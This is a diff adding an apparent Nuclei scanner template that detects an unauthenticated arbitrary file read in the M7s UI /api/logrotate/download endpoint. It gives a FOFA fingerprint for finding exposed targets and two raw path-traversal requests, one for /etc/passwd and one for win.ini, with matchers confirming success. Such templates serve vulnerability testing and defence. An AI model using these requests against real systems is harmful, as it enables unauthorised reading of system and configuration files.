@@ -1,0 +1,44 @@
+id: M7s-UI-download-File-reading
+
+info:
+  name: M7s UI /api/logrotate/download 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="static/js/chunk-libs.9540f991.js"
+    M7s UI /api/logrotate/download 接口处任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://mp.weixin.qq.com/s/o0kIRFB7PrDpC-8_FqierQ
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /api/logrotate/download?file=../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0'
+          - '/bin/false'
+        condition: and
+      - type: status
+        status: 
+          - 200
+  - raw:
+      - |
+        GET /api/logrotate/download?file=../C://Windows/win.ini HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
